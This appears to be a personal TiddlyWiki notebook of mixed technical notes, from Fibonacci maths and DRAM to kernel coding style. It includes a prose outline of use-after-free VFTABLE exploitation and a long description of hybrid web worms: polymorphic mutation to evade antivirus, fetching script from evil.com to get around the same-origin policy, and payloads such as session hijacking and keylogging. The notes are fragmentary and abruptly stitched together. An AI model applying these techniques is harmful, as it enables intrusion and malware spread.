[img[images/dangling_pointer_1.jpg]]

In order to exploit the vulnerability, we will set the first DWORD of the malicious data to contain special address that will take the place of the object's VFTABLE. The rest of the memory will contain a shellcode that will be executed. 

In order to use the exploit
#Find an address somewhere in the memory that holds the CALL/JMP ECX, which we will refer to it as the Call Address. Next we need to find a location somewhere in the memory that points to the Call Address.
#Change the VFTABLE pointer so that its value is (Pcall Address – OFFSET), which we'll call the Jumping Address
#Ensure that our new “VFTABLE pointer”, when interpreted as code, can be executed and doesn't significantly change the application flow and content of the registers. This is important because the CALL/JMP ECX is transferring the execution of the application to the start of our inserted buffer that holds the Jumping Address.  

We need to be able to overwrite the object's VFTABLE with our own value (after the object's de-allocation and before virutal function call). This means we need to find places where :

#The application allocates the exact amount of memory required for the malicious data
#The memory chunk's content is filled with user supplied data.
#The allocation must assign memory in the old object's heap, and not a different heap.

!Ethereal cooked capture
Cooked capture when capture is done over '-i any' device. 

http://www.ethereal.com/lists/ethereal-users/200412/msg00314.html
&lt;&lt;&lt;
On Linux, packet capturing is done by opening a socket. In systems with a 2.2 or later kernel, the socket is a PF_PACKET socket, either of type SOCK_RAW or SOCK_DGRAM.

A SOCK_RAW socket supplies the packet data including what the driver specified, when constructing the socket buffer (skbuff) holding the packet, to be the packet's link-layer header; a SOCK_DGRAM packet supplies only data above what was specified by the driver to be the link-layer header.

For the purposes of libpcap, which is the library used by programs such as tcpdump, Ethereal/Tethereal, snort, etc. to capture network traffic, a SOCK_RAW socket is usually the appropriate type of socket on which to capture, and is what's used.

Unfortunately, the purported link-layer header might be missing (as is the case for some PPP interfaces), or might contain random unpredictable amounts of data (as is the case for at least some interfaces using ISDN), or might not contain enough data to determine the type of the packet (as is the case with at least some ATM interfaces), so capturing with a SOCK_RAW socket doesn't always work well.

For interfaces of those types - and for interfaces of a type that libpcap currently doesn't have code to support - libpcap uses a SOCK_DGRAM socket, and constructs a fake link-layer header from the address supplied by a &quot;recvfrom()&quot; on that socket.

A &quot;Linux cooked capture&quot; is one done with libpcap using a SOCK_DGRAM socket.

!fibonnaci in nature
sprials on any fruit or flowers are fibonnaci numbers
Any number can be expressed as a sum of fibonnaci numbers without any repititions
45 = 34 + 8 + 3

!fibonnaci with different seeds

!Generating fibonnaci number
4th + 5th = 6th
2*5th - 3th = 6th
5th*5th (+ or -) 1 = 4th * 6th


!Golden Ratio
Ratio of 2 consecutive fibonnaci numbers converges to 1.61803 as a fraction 1 + sqrl(5)  whole divide / 2. Derived using x = 1 + (1 / (1+x)).
No matter what the starting seeds the ratio also converges to golden ratio

!Golden Rectangle
Golden rectangle's ratio of length/breadth is the golden ratio. To draw a golden rectangle take a square extend its a base. Take the midpoint of the base and draw an arc with the length of the midpoint to the top corner and cut the base at that distance. If we extend the square to this point to form a rectangle it is an golden rectangle. 

[img[images/construct.golden.rectangle.png]]

If we consider the side of square as 2x. The triangle formed with midpoint and vertical side is right triangle with base x and height 2x. The hypotenuse is x*sqrt(5), which is the length of the arc that we have drawn. Now when we extend this square to a rectangle the base becomes x + x*sqrt(5). The ratio comes down as the golden ratio. And this triangle is also called golden triangle

!Golden Triangle
Right-angled triangle with height twice of base. 5 pieces of golden triangle can be used to a larger golden triangle with base sqrt(5) times the original base. This is only triangle which has this property. Ordinary triangles can be created with 4 pieces of similar triangles. 

[img[images/golden.triangle.png]]

!Generating a spiral from Golden Rectangles
Take a golden rectangle, cut a square out of the rectangle with the side of height. This would again result in another rectangle. If the original rectangle base is (sqrt(5) + 1), and height 2. When we cut a square of side 2. we end with base of sqrt(5) + 1 - 2 = sqrt(5) -1  and base 2. This when we multiply with sqrt(5) + 1 on both numeritor and denominator we would endup with golden ratio. This is the only rectangle which has this property of being able to generate similar rectangle when a square is cut from it. 

When the try to goin corners of these rectangles with a smooth arc we generate a spiral.

<pre>If you do not have an extra hard disk or laptop where you could plugin the faulty disk for recovery and just want to retrieve your data ASAP you could try using Trinity. Trinity Rescue Kit or TRK is a free live Linux distribution that aims specifically at recovery and repair operations on Windows and Linux machines.

The iso image can be downloaded from http://trinityhome.org/

You might have to refer a couple of man pages before this works but the short procedure would be. Boot using the rescue CD, it obtains network ip using dhcp so you should have nfs/ssh access to the server on which you want to backup your disk. Use ddrescue to recover as much of the corrupted disk as possible. Alternately you could mount the ntfs partition and retrieve the files you want.

the value of ${val_TEST} will be seen to be 3, checked using set or env. Reading the value is a little trickier. It can be performed directly if the key name is constant:

{{{
echo &quot;${val_TEST}&quot;
}}}

However, to use a variable key, perform the following:

{{{
echo &quot;$(eval echo \$val_${n})&quot;
}}}

This acts as a pointer and should then return 3.

In order to run the hash, set or env can be used along with a pattern matching utility, i.e. grep or egrep, especially if the variable name prefix is very specific (i.e. val_).

!Shortcuts
Access keys are shortcuts to common functions accessed by typing a letter with either the 'alt' (PC) or 'control' (Mac) key:
|!PC|!Mac|!Function|
|Alt-F|Ctrl-F|Search|
|Alt-J|Ctrl-J|NewJournal|
|Alt-N|Ctrl-N|NewTiddler|

These access keys are provided by the associated internal [[Macros]] for the functions above. The macro needs to be used in an open tiddler (or the MainMenu or SideBar) in order for the access keys to work.

While editing a tiddler:
* ~Control-Enter or ~Control-Return accepts your changes and switches out of editing mode (use ~Shift-Control-Enter or ~Shift-Control-Return to stop the date and time being updated for MinorChanges)
* Escape abandons your changes and reverts the tiddler to its previous state

<div title="Hybrid Web Worms" modifier="BhargavaKancherla" modified="200807071119" created="200801140827" changecount="5">
<pre>!Hybrid Web Worms

Hybrid web worms attempt to overcome many of the limitations of web worms. A hybrid web worm is a worm that can run on both a web browser or a web server. This allows the hybrid web worm to take advantage of the enormous number of cross-site scripting vulnerabilities, but while allowing the same worm to utilise the rarer but morepowerful command execution vulnerabliity on a web server. These two differnet execution models are stored in the same worm and this allows hyrbid web worm to survive various situations. 

Alice visits infected.com and receives the ~JavaScript version of the hybrid web worm. The perl version of the worm lies dormant inisde the ~JavaScript version. The ~JavaScript code runs in Alice's browser and uses Alice's machine to exploit a command execution vulnerablility on site.com. The ~JavaScript version of the worm injects the Perl version of the worm (with a copy of ~JavaScript version inside) into site.com. On the web server hosting site.com the Perl code runs and injects the Perl version into another vulnerable web server other.com, this time located at other.com. When the code runs on the wbe server hosting other.com the hyrbid web worm wirtes the ~JavaScript version of itself into the web pages on other.com. When bob visits other.com the ~JavaScript version of the hybrid web worm is downloaded to his browser and the process continues. 

In addition to running in multiple environments, hybrid web worms also mutate their source code as they propogate to evade security systems or anti-virus programs. Hybrid worms can also update themselves with new vulnerabilities to exploit while in the wild. All of these features are designed to increase the lifespan of the worm. 

A hyrbid worm typically has more capabliites when running on a web server than when running on the client in a web server. For example, it may have access to native commands on the web server such as netstat or wget allowing it to easily conduct HTTP transactions with arbitary sites. It might also have access to full language interpreters such as Perl, PHP, Python or Ruby. 

Hyrbrid web worms attempt to evade detection from security products by mutating the source code to prevent all mutations of the code from containing a common signature. The source code from the hybrid worm is directly visible and this source code and all litreals are mutated with each infection.

A //reversable mutation// is a mutation which produces code that can be further mutated using some mutation function. A //final muatation// is a mutation whic produces code that cannot be mutated further using some mutation function. A security product could potentially create a signature for this final //stead-state// to detect malicious code. To prevent a final //steady-state// of the code that cannot be further mutated it is paramount to minimize the number of //final mutation// algorithms in the hybrid worm. Assuming mutations are chosen with the same probability, the probability that the Nth generation of code can be mutated further is given by the formula
{{{
number of reversable mutations
--------------------------------    power of N
Total number of mutations
}}}
For example, if you had five mutation functions, four which were reversible and one which was final, then after 14 generations a sample of code has only a 4% chance of mutating further.

Another concern when mutating code is increasing the size of successive genrations. If mutations only increase the lenght of the malware will grow without size, inhibiting its ability to effectively transport itself from host to host. There must be a corresponding mutation that can unde these size increases to prevent the soruce from growing without bounds. In general mutations would be throttled to ensure too much code does not change too quickly to ensure maximum diversity.

!Control flow structures

Control from sturctures like do-while, while and for can be mutated interchangeably. if, while and switch can also be mutated interchangeably. But there are no mutations to convert a code block into a do..while loop. This means any do..while loops in the original source code will quickly be mutated away.

!Literal Expansion and Collapsing

The mutation engine will expand and collapse string or numeric literals. For example a literal string such as as &quot;spi dynamics&quot; can be broken into pieces and concatenated together such as &quot;spi dy&quot;+&quot;namics&quot; or &quot;spi dynami&quot;+&quot;ics&quot;. It should be noted that each time a string literal is expanded using this method overall length of the worm increase by 3 character for the additional &quot;+&quot;. Another option is to convert a string literal into a sequence of character codes such as String.fromCharCode(115,112,105,32,100,121,110,97,109,105,99,115). This is beneficial it converts string literals into numeric literals which can be mutated into more forms than string literals. 

Numeric literals offer many opportunity for mutation. First of all literals can be represented using various number bases such as decimal, octal or hexadecimal. Numerical literals can be expanded much like string literals by performing two mathematical operations which cancel each other out. 

Collapsing code must also be written which is capable of detecting the literal expansions and collapsing them back into the original form.  

!Variable Renaming

Another obvious mutation is to change all the variable and function names. However, unless the word generating algorithm is desinged with care detectable artifacts can be introduced into the hybrid web worm. A common idea is to simply random select letters. Simple cryptographic analysis could be used to find variables that were randomly generated without any thought to letter selection.

Another viable method involves using the words on the web page the hybrid worm is injected into. 

!Inserting Non-code Element

Inserting random whitespace or comments to evade signature based detection mechanisms. Not much useful as language toeknizers will ignore them. 

!Other Possible Mutations

Other possible mutations include adding a do-nothing code such as If (false) {...}, (x OR 0), or (x AND x) and detecting/removing it without potentially altering the original code functionality is difficult is difficult without complex language toeknizing and parsing code. 

Mutation is not just lmited to interchangeable logic structures but also spans to communictaion functions. For example, the hybrid web worm might use an Image  object to send data to back to an attacker. This can be mutated to using an OBJECT tag or FORM tag in later generations. 

!Updating Attack Vectors

All worms have a pool of exploitable systems. This pool is defined by the number of hosts vulnerable to a given vulnerability, the ease of discovering those hosts, and whether those hosts are reachable from infected hosts. Worms which exploit a single vulnerability have a smaller pool of potentially infectabel machines that worms which exploit multiple vulnerabilities. 

There are two ways the hybrid worm can learn about new attack vectors while in the wild
#by retreiving information on known vulnerabilities from a public website
#independently discovering the unknown vulnerablities themselves

!Fething New, Known Vulnerablites

Many neutral(non-attacker controlled) websites publish information about new application vulnerablities in standardised format. Worms can read from these soruces to update their vulnerability list.

Another potential source of vulnerablities are defacer //score board// style sites such as ~Zone-H or xseed.com. These sites list specific websites that are vulnerable an dthe attack stirng used to exploit them. This is a much more explicit description of the attack vector allowing the hybrid web  wrom to know exactly where to insert its attack payload. While this allows the hybrid web worm to exploit  specific sites it is less helpful for the long term survivability of the worm than attack vectors disclosed for against a common component present on multiple sites. 

Another source of attack vectors would be for an attacker to manually publish machine consumable vulnerability information on multiple public and highly mirrored mailing lists. this provides a best of both worlds scenarios in the attacker can supply the hybrid web worm with new and very specific attack vector information wihout needin ga single bottleneck website they control that can be blocked.

!Discovering New Vulnerabilites

The hybrid could also attempt to find new vulnerabilities on its own using a a web vulnerability scanner. While on the server, the hybrid might be able to use nmap to find new targets on the web server's intranet and use 'Nikto' to find vulnerabilites to inject itself into. On the client the web vulnerability scanner //Jikto// could be used. Activities like port scanning and vulnerability scanning  can take large amounts of time, especially when done inside of an interpreted program running inside of a browser which has HTTP conenction limitations. Offline Ajax frameworks such as Google Gears provide a threading model to allow large ~JavaScript jobs to run wihtout interrption. This could make client-side scanning applicable in more situations. 

!Finding and Infecitng New Hosts

Methods a web worm can use to discover new hosts to infect in the wild
#port scanning for new targets
#retreiving a list of new targets from a conrtolling 3rd party (ala ~XSS-Proxy or Backframe) 
#querying search engines for newtargets

Due to ~JavaScript's Same Origin Policy, it is difficult for a hybrid worm to running on the client to query a search engine for new targets and be able to read the response. One of the methods bypassin g this is to use the cross domain communication method using 'proxy' websites first discovered by Petko Petkov and further refined by one of the authors for Jikto. This method has the added benefits of working cross-platform and cross-browser, does  not require special circumstances and does not rely on single mashup or API that could change without notice. 

The first step the hyrbid performs is creating an IFRAME pointed at site that provide proxy funcitonality. In the next step, the worm uses this IFRAME to download ~JavaScript from evil.com into the security domain of the proxy site. This allows the ~JavaScript to side-step the Same Origin Policy and use Ajax to contact the proxy site and send search requests to Google to find possible targets. Once these targets are located the hybrid web worm can then send blind GETS and POSTS to the target websites infecting with the new mutated copies of the hybrid web worm. 

So-called Google hacking provides a means for using search engines to find target websites that are running vulnerable versions of a specific web component. A query for 'Powered by XYZ version 4.1' is not enough. The Perl.Santy worm used Google to find websites running a vulnerable versions of phpBB. To avoid static detection by Google hybrid web worms update their attack vectors and also its search string. In addition, the hyrbrid worm adds a random number of random words to the query. 

The context of the hybrid worm dicatates the methods it can use to spread to other targets. When running on a client, the worm can use various methods such as large image object, various HTML tags, and the Iframes to send blind HTTP ~GETs and ~POSTs to other domains. Using a CSS and ~JavaScript the worm could determine which sites a user has visited or which sites they are looged into thus having a higher probability of leveraing cached login credential to propogate. When running on a server, command execution vulnerabilities attacks can load and execute full executables. Common methods would include using fopen, Perl:LWP , Sockets or any other available networ or file based functions. The server-side code can write the client-side version of itself into the webpages hosted on the web server.

!Worm Payloads

The payloads of web worm can vary depending on where the worm is executing. When execting on a client, all the nasty ~JavaScript techniques discovered in recent years, including session hijacking, port scanning, keystroke and mouse movement logging, theft of content, website history and search engine query theft. 

When execuitng on a server, more options are available. When exploiting a command Execution Vulnerabliity the hybrid worm can launch tools or commands on the target as the user id of the serivce infected. It is possible to leverage a local exploit to escalate to admin privileges. This can allow for kernel level backdoors to ensure the worms duration on the target.

<pre>!Interface Fuzzing

''Fuzzing'' is a technique that sends various different inputs into the test target. It may send malformed characters or special characters such as a single quote.

The result of fuzzing is usually analysed using two different approaches
#Signature analysis
#Behaviour analysis

''Signature analysis'' analyses the response to see whether anything in the reponse matches any of the known signatures that have been known to be indications that a vulnerability exists. 

''Behaviour analysis'' is looking for a particular string to appear in the response, this approach looks at the behaviour of the application. Are the results same as before ? How has the response changed? 

''Fuzzing'' is simply another term for interface robustness testing. Robustness testing often indicates security testing of user accessible interfaces, often called the ''attack surface''. 

''White box fuzzing'' indicates access to source code. Black-box indicates the ability to supply data to running program, but no source code. In Grey box while no access to source code is directly granted, it is possible to monitor the running executable in as much detail as a debugger and/or static binary analysis will permit.

<pre>!Network Intrusion Detection Systems (NIDS)

//''Web Application Firewalls''// (~WAFs), work by interfacing with the web server running the web application at the top level of the network stack, thus having the ability to analyzing encrypted data ( the web server performs the decryption) as well as HTTP meta data. 

//''Signature Based Systems''// (SBS) based on pattern matching engines, use a database containing signatures of well-known attacks to detect malicious activities. Attack patterns can be found in lict data, generating false positive alerts.

//''~Anamoly-Based systems''// (~ABSs) usually establish an ''ad hoc'' model describing the behaviour of the monitored system and flag any deviating activity as suspicious. Therefore these systems are able to detect new attacks as they take place, without any previous knowledge, however an extensive training phase is required to build the model and because of their nature, ~ABSs are well-known to generate a higher false positive rate than ~SBSs.

Bonding for link aggregation must be supported by both endpoints. Two linux machines connected via crossover cables can take advantage of link aggregation. A single machine connected with two physical cables to a switch which supports port trunking can use link aggregation to the switch. Any conventional switch will become ineffably confused by a hardware address appearing on multiple ports simultaneously.

!!!Indentation
Tabs are 8 characters, and thus indentations are also 8 characters.
{{{
/*
 * The preferred way to ease multiple indentation levels 
 * in a switch statement is
 * to align the &quot;switch&quot; and its subordinate &quot;case&quot; labels 
 * in the same column
 * instead of &quot;double-indenting&quot; the &quot;case&quot; labels.  E.g.:
 */

switch (suffix) {
case 'G':
case 'g':
	mem &lt;&lt;= 30;
	break;
case 'M':
case 'm':
	mem &lt;&lt;= 20;
	break;
case 'K':
case 'k':
	mem &lt;&lt;= 10;
	/* fall through */
default:
	break;
}
}}}

!!!Breaking long lines
{{{
void fun(int a, int b, int c)
{
	if (condition)
		printk(KERN_WARNING &quot;Warning this is a long printk with &quot;
                                            &quot;3 parameters a: %u b: %u &quot;
                                            &quot;c: %u \n&quot;, a, b, c);
	next_statement;
}
}}}

!!!Placing Braces
{{{
if (x is true) {
        we do y
}

/* functions are a special case, the brace comes in the next line */
int function(int x)
{
        body of function
}
}}}

!!!Spaces
{{{
/* 
 * So use a space after these keywords:
 *        if, switch, case, for, do, while
 * but not with sizeof, typeof, alignof, or __attribute__.  E.g.,
 *        s = sizeof(struct file);
 */

/*
 * Do not add spaces around (inside) parenthesized expressions.  This example is
 * bad:
 */
        s = sizeof( struct file );

/* 
 * When declaring pointer data or a function that returns a pointer type, the
 * preferred use of '*' is adjacent to the data name or function name and not
 * adjacent to the type name.  Examples:
 */

        char *linux_banner;
        unsigned long long memparse(char *ptr, char **retptr);
        char *match_strdup(substring_t *s);

/*
 * Use one space around (on each side of) most binary and ternary operators,

 *
 * no space after the prefix increment &amp; decrement unary operators:
 *        ++  --
 *
 * and no space around the '.' and &quot;-&gt;&quot; structure member operators.
 */
}}}

!!!Functions
The maximum length of a function is inversely proportional to the complexity and indentation level of that function.

{{{
/* 
 * In source files, separate functions with one blank 
 * line.  If the function is exported, the EXPORT 
 * macro for it should follow immediately after the  
 * closing function brace line.  E.g.:
 */

int system_is_up(void)
{
        return system_state == SYSTEM_RUNNING;
}
EXPORT_SYMBOL(system_is_up);
}}}

!!!Function Prototypes
In function prototypes, include parameter names with their data types. Although this is not required by the C language, it is preferred in Linux because it is a simple way to add valuable information for the reader.

!!!~GOTOs for exiting
The goto statement comes in handy when a function exits from multiple locations and some common work such as cleanup has to be done.

The rationale is:
* unconditional statements are easier to understand and follow
* nesting is reduced
* errors by not updating individual exit points when making modifications are prevented
* saves the compiler work to optimize redundant code away

{{{
int fun(int a)
{
        int result = 0;
        char *buffer = kmalloc(SIZE);

        if (buffer == NULL)
                return -ENOMEM;

        if (condition1) {
                while (loop1) {
                        ...
                }
                result = 1;
                goto out;
        }
        ...
out:
        kfree(buffer);
        return result;
}
}}}

!!!Comments
The preferred style for long (multi-line) comments is:
{{{
/*
 * This is the preferred style for multi-line
 * comments in the Linux kernel source code.
 * Please use it consistently.
 *
 * Description:  A column of asterisks on the left side,
 * with beginning and ending almost-blank lines.
 */
}}}

!!!Macros

* Names of macros defining constants and labels in enums are capitalized.
{{{
#define CONSTANT 0x12345
}}}
* Enums are preferred when defining several related constants.
* CAPITALIZED macro names are appreciated but macros resembling functions
may be named in lower case.
* Generally, inline functions are preferable to macros resembling functions.
* Macros with multiple statements should be enclosed in a do - while block:

{{{
#define macrofun(a, b, c)                       \
        do {                                    \
                if (a == 5)                     \
                        do_this(b, c);          \
        } while (0)
}}}

* Things to avoid when using macros:
** macros that affect control flow is a _very_ bad idea. It looks like a function call but exits the &quot;calling&quot; function; don't break the internal parsers of those who will read the code.
{{{
#define FOO(x)                                  \
        do {                                    \
                if (blah(x) &lt; 0)                \
                        return -EBUGGERED;      \
        } while(0)
}}}
** macros that depend on having a local variable with a magic name might look like a good thing, but it's confusing as hell when one reads the code and it's prone to breakage from seemingly innocent changes.
{{{
#define FOO(val) bar(index, val)
}}}
** macros with arguments that are used as l-values: FOO(x) = y; will bite you if somebody e.g. turns FOO into an inline function.
** forgetting about precedence: macros defining constants using expressions must enclose the expression in parentheses. Beware of similar issues with macros using parameters.
{{{
#define CONSTANT 0x4000
#define CONSTEXP (CONSTANT | 3)
}}}

!!!Allocating memory
The kernel provides the following general purpose memory allocators:''kmalloc(), kzalloc(), kcalloc(), and vmalloc()''. Please refer to the API documentation for further information about them.

The preferred form for passing a size of a struct is the following:
{{{
        p = kmalloc(sizeof(*p), ...);
}}}
The alternative form where struct name is spelled out hurts readability and introduces an opportunity for a bug when the pointer variable type is changed but the corresponding sizeof that is passed to a memory allocator is not.

''Casting the return value'' which is a void pointer is ''redundant''. The conversion from void pointer to any other pointer type is guaranteed by the C programming language.

!!!inline
* Abundant use of the inline keyword leads to a much bigger kernel, which in turn slows the system as a whole down, due to a bigger icache footprint for the CPU and simply because there is less memory available for the pagecache. Just think about it; a pagecache miss causes a disk seek, which easily takes 5 miliseconds. There are a LOT of cpu cycles that can go into these 5 miliseconds.
* A reasonable rule of thumb is to not put inline at functions that have more than 3 lines of code in them.
* Often people argue that adding inline to functions that are static and used only once is always a win since there is no space tradeoff. While this is technically correct, gcc is capable of inlining these automatically without help, and the maintenance issue of removing the inline when a second user appears outweighs the potential value of the hint that tells gcc to do something it would have done anyway.

!!!Function return values
Functions can return values of many different kinds, and one of the most common are
# value indicating whether the function succeeded or failed. Such a value can be represented as an error-code ''integer'' (''-Exxx = failure, 0 = success'') 
# a succeeded ''boolean'' (''0 = failure, non-zero = success'').

If the name of a function is an action or an imperative command, the function should return an error-code integer.  If the name is a predicate, the function should return a succeeded boolean.
{{{
/*
 * For example, &quot;add work&quot; is a command, and the 
 * add_work() function returns 0 for success or -EBUSY for failure.  
 * In the same way, &quot;PCI device present&quot; is a predicate,
 * and the pci_dev_present() function returns 1 if it succeeds in
 * finding a matching device or 0 if it doesn't.
 */

<pre>!Solid-state 
Solid-state electronic components, devices, and systems are based entirely on the semiconductor, such as transistors, microprocessor chips, and the bubble memory. In solid-state components, there is no use of the electrical properties of a vacuum and no mechanical action, no moving parts. In a solid-state component, the current is confined to solid elements and compounds engineered specifically to switch and amplify it. Current flows in two forms: as negatively-charged electrons, and as positively-charged electron deficiencies called electron holes or just &quot;holes&quot;. Both the electron and the hole are called charge carriers.

Examples of a non-solid-state electronic components are vacuum tubes and cathode-ray tubes (CRTs). In this device, electrons flow freely through a vacuum from an electron gun, through deflecting and focusing fields, and finally to a phosphorescent screen.

Solid-state devices are much faster and more reliable than mechanical disks and tapes, but are usually more expensive.

!SRAM and DRAM
Dynamic random access memory (DRAM) is a type of random access memory that stores each bit of data in a separate capacitor within an integrated circuit. Since real capacitors leak charge, the information eventually fades unless the capacitor charge is refreshed periodically. Because of this refresh requirement, it is a dynamic memory as opposed to SRAM and other static memory.

The advantage of DRAM is its structural simplicity: only one transistor and a capacitor are required per bit, compared to six transistors in SRAM. This allows DRAM to reach very high density.

For economic reasons, the large (main) memories found in personal computers, workstations, and non-handheld game-consoles (such as Playstation and Xbox) normally consists of dynamic RAM (DRAM). Other parts of the computer, such as cache memories and data buffers in hard disks, normally use static RAM (SRAM).

DRAM (memory) modules
* Single In-line Pin Package (SIPP)
* Single In-line Memory Module (SIMM)
* Dual In-line Memory Module (DIMM)

Common DRAM packages :
1. DIP 16-pin (DRAM chip, usually pre-FPRAM)
2. SIPP (usually FPRAM)
3. SIMM 30-pin (usually FPRAM)
4. SIMM 72-pin (so-called &quot;PS/2 SIMM&quot;, usually EDO RAM)
5. DIMM 168-pin (SDRAM)
6. DIMM 184-pin (DDR SDRAM)
7. RIMM 184-pin
8. DIMM 240-pin (DDR2 SDRAM/DDR3 SDRAM)

!!!SDRAM
SDRAM refers to synchronous dynamic random access memory, a term that is used to describe dynamic random access memory that has a synchronous interface. Traditionally, dynamic random access memory (DRAM) has an asynchronous interface which means that it responds as quickly as possible to changes in control inputs. SDRAM has a synchronous interface, meaning that it waits for a clock signal before responding to control inputs and is therefore synchronized with the computer's system bus. The clock is used to drive an internal finite state machine that pipelines incoming instructions. This allows the chip to have a more complex pattern of operation than asynchronous DRAM which does not have a synchronized interface.

Pipelining means that the chip can accept a new instruction before it has finished processing the previous one. In a pipelined write, the write command can be immediately followed by another instruction without waiting for the data to be written to the memory array. In a pipelined read, the requested data appears after a fixed number of clock pulses after the read instruction, cycles during which additional instructions can be sent. (This delay is called the latency and is an important parameter to consider when purchasing SDRAM for a computer.)

Originally simply known as &quot;SDRAM&quot;, Single Data Rate SDRAM can accept one command and transfer one word of data per clock cycle. Typical clock frequencies are 100 and 133 MHz. Chips are made with a variety of data bus sizes.

!!!SDRAM operation

A 512 megabyte (i.e., 512 MiB) SDRAM DIMM might be made of 8 or 9 SDRAM chips, each containing 512 Mbit (512 Mibit) of storage, and each one contributing 8 bits to the DIMM's 64- or 72-bit width.

A typical 512 Mbit SDRAM chip internally contains 4 independent 16 Mbyte banks. Each bank is an array of 8192 rows of 16384 bits each. A bank is either idle, active, or changing from one to the other.

An active command activates an idle bank. It takes a 2-bit bank address (BA0âBA1) and a 13-bit row address (A0âA12), and reads that row into the bank's array of 16384 sense amplifiers. This is also known as &quot;opening&quot; the row. This operation has the side effect of refreshing that row.

Once the row has been activated or &quot;opened&quot;, read and write commands are possible. Each command requires a column address, but because each chip works on 8 bits at a time, there are 2048 possible column addresses, needing only 11 address lines (A0âA9,A11). Activation requires a minimum time, called the row-to-column delay, or tRCD. This time, rounded up to the next multiple of the clock period, specifies the minimum number of cycles between an active command, and a read or write command. During these delay cycles, arbitrary commands may be sent to other banks; they are completely independent.

When a read command is issued, the SDRAM will produce the corresponding output data on the DQ lines in time for the rising edge of the clock 2 or 3 cycles later (depending on the configured CAS latency). Subsequent words of the burst will be produced in time for subsequent rising clock edges.

A write command is accompanied by the data to be written on the DQ lines during the same rising edge. It is the duty of the memory controller to ensure that the SDRAM is not driving read data on the DQ lines at the same time that it needs to drive write data on those lines. This can be done by waiting until a read burst is not in progress, terminating the read burst, or using the DQM control line.

When the memory controller wants to access a different row, it must first return that bank's sense amplifiers to an idle state, ready to sense the next row. This is known as a &quot;precharge&quot; operation, or &quot;closing&quot; the row. A precharge may be commanded explicitly, or it may be performed automatically at the conclusion of a read or write operation. Again, there is a minimum time, the row precharge delay, tRP, which must elapse before that bank is fully idle and it may receive another active command.

Although refreshing a row is an automatic side effect of activating it, there is a minimum time for this to happen, which requires a minimum row access time tRAS, that must elapse between an active command opening a row, and the corresponding precharge command closing it. This limit is usually dwarfed by desired read and write commands to the row, so its value has little effect on typical performance.

!!!DDR SDRAM
While the access latency of DRAM is fundamentally limited by the DRAM array, DRAM has very high potential bandwidth because each internal read is actually a row of many thousands of bits. To make more of this bandwidth available to users, a Double Data Rate interface was developed. This uses the same commands, accepted once per cycle, but reads or writes two words of data per clock cycle. It achieves nearly twice the bandwidth of the preceding [single data rate] SDRAM by double pumping (transferring data on the rising and falling edges of the clock signal) without increasing the clock frequency.

With data being transferred 64 bits at a time, DDR SDRAM gives a transfer rate of (memory bus clock rate) Ã 2 (for dual rate) Ã 64 (number of bits transferred) / 8 (number of bits/byte). Thus with a bus frequency of 100 MHz, DDR SDRAM gives a maximum transfer rate of 1600 MB/s.

DDR SDRAM for desktop computers DIMMs have 184 pins (as opposed to 168 pins on SDRAM, or 240 pins on DDR2 SDRAM), and can be differentiated from SDRAM DIMMs by the number of notches (DDR SDRAM has one, SDRAM has two). DDR for notebook computers SO-DIMMs have 200 pins which is the same number of pins as DDR2 SO-DIMMs. These two specifications are notched very similarly and care must be taken during insertion when you are unsure of a correct match. DDR SDRAM operates at a voltage of 2.5 V, compared to 3.3 V for SDRAM. This can significantly reduce power consumption. Chips and modules with DDR-400/PC-3200 standard have a nominal voltage of 2.6 Volt.

DDR2 SDRAM is very similar to DDR SDRAM, but doubles the minimum read or write unit again, to 4 consecutive words. The bus protocol was also simplified to allow higher performance operation. (In particular, the &quot;burst terminate&quot; command is deleted.) This allows the bus rate of the SDRAM to be doubled without increasing the clock rate of internal RAM operations; instead, internal operations are performed in units 4 times as wide as SDRAM.

DDR3 continues the trend, doubling the minimum read or write unit to 8 consecutive words. This allows another doubling of bandwidth and external bus rate without having to change the clock rate of internal operations, just the width.

!Flash Memory
Flash memory is non-volatile computer memory that can be electrically erased and reprogrammed. It is a technology that is primarily used in memory cards and USB flash drives. 

It is a specific type of EEPROM (Electrically Erasable Programmable Read-Only Memory) that is erased and programmed in large blocks.

Flash memory costs far less than byte-programmable EEPROM and therefore has become the dominant technology wherever a significant amount of non-volatile, solid state storage is needed.

Flash memory is non-volatile, which means that no power is needed to maintain the information stored in the chip. In addition, flash memory offers fast read access times (although not as fast as volatile DRAM memory used for main memory in PCs) and better kinetic shock resistance than hard disks. Another feature of flash memory is that when packaged in a &quot;memory card,&quot; it is enormously durable, being able to withstand intense pressure, extremes of temperature, and even immersion in water.

Although technically a type of EEPROM, the term &quot;EEPROM&quot; is generally used to refer specifically to non-flash EEPROM which is erasable in small blocks, typically bytes. Because erase cycles are slow, the large block sizes used in flash memory erasing give it a significant speed advantage over old-style EEPROM when writing large amounts of data.

!!!Flash operation
Flash memory stores information in an array of memory cells made from floating-gate transistors. In traditional single-level cell (SLC) devices, each cell stores only one bit of information. Some newer flash memory, known as multi-level cell (MLC) devices, can store more than one bit per cell by choosing between multiple levels of electrical charge to apply to the floating gates of its cells.
A flash memory cell.

!!!Block erasure
One limitation of flash memory is that although it can be read or programmed a byte or a word at a time in a random access fashion, it must be erased a &quot;block&quot; at a time. This generally sets all bits in the block to 1. Starting with a freshly erased block, any location within that block can be programmed. However, once a bit has been set to 0, only by erasing the entire block can it be changed back to 1. In other words, flash memory (specifically NOR flash) offers random-access read and programming operations, but cannot offer arbitrary random-access rewrite or erase operations. A location can, however, be rewritten as long as the new value's 0 bits are a superset of the over-written value's. For example, a nibble value may be erased to 1111, then written as 1110. Successive writes to that nibble can change it to 1010, then 0010, and finally 0000. In practice few algorithms can take advantage of this successive write capability and in general the entire block is erased and rewritten at once.

!!!Memory Wear
Another limitation is that flash memory has a finite number of erase-write cycles. Most commercially available flash products are guaranteed to withstand around 100,000 write-erase-cycles.[citation needed] The guaranteed cycle count may apply only to block zero (as is the case with TSOP NAND parts), or to all blocks (as in NOR). This effect is partially offset in some chip firmware or file system drivers by counting the writes and dynamically remapping blocks in order to spread write operations between sectors; this technique is called wear levelling.
Another approach is to perform write verification and remapping to spare sectors in case of write failure, a technique called bad block management (BBM). For portable consumer devices, these wearout management techniques typically extend the life of the flash memory beyond the life of the device itself, and some data loss may be acceptable in these applications. For high reliability data storage, however, it is not advisable to use flash memory that has been through a large number of programming cycles. This limitation does not apply to 'read-only' applications such as thin clients and routers, which are only programmed once or at most a few times during their lifetime.

!!!Low-level access

The low-level interface to flash memory chips differs from those of other memory types such as DRAM, ROM, and EEPROM, which support bit-alterability (both zero to one and one to zero) and random-access via externally accessible address buses.

